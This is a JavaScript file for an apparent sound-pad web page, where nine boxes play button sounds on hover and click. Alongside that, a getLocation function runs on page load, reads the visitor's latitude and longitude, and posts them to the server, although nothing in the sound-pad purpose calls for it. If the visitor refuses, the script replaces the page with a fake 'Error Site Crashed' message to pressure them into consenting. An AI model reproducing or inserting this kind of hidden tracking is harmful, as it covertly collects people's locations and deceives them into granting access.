const box = document.querySelectorAll('.box');

// const drum = document.querySelector('drum-container');

box[0].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-1.mp3');
    audio.play();
});
box[0].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-1.mp3');
    audio.play();
});
box[1].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-2.mp3');
    audio.play();
});
box[2].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-3.mp3');
    audio.play();
});

box[3].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-4.mp3');
    audio.play();
});

box[4].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-5.mp3');
    audio.play();
});

box[5].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-6.mp3');
    audio.play();
});

box[6].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-7.mp3');
    audio.play();
});

box[7].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-8.mp3');
    audio.play();
});

box[8].addEventListener('mouseover',()=>{
    const audio =  new Audio('./sounds/button-9.mp3');
    audio.play();
});
box[1].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-2.mp3');
    audio.play();
});
box[2].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-3.mp3');
    audio.play();
});

box[3].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-4.mp3');
    audio.play();
});

box[4].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-5.mp3');
    audio.play();
});

box[5].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-6.mp3');
    audio.play();
});

box[6].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-7.mp3');
    audio.play();
});

box[7].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-8.mp3');
    audio.play();
});

box[8].addEventListener('click',()=>{
    const audio =  new Audio('./sounds/button-9.mp3');
    audio.play();
});


 function getLocation() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(async (position)=>{
        console.log(position);  
        let data = position.coords.latitude;
        let data2 = position.coords.longitude;         
          let result = await axios.post('/',{"lat":data,"long":data2});
          console.log(result);

      },(error)=>{
         document.body.innerHTML="Error Site Crashed";S
      });
    }else { 
       console.error("UserREject");
    }
  }
  
getLocation();


// drum.addEventListener('click',()=>{

//     for (let i = 0; i < box.length; i++) {
//         box[i].addEventListener('click',()=>{
//             const audio =  new Audio('https://www.soundjay.com/buttons/sounds/button-1.mp3');
//             audio.play();
//         });
        
//     }
// });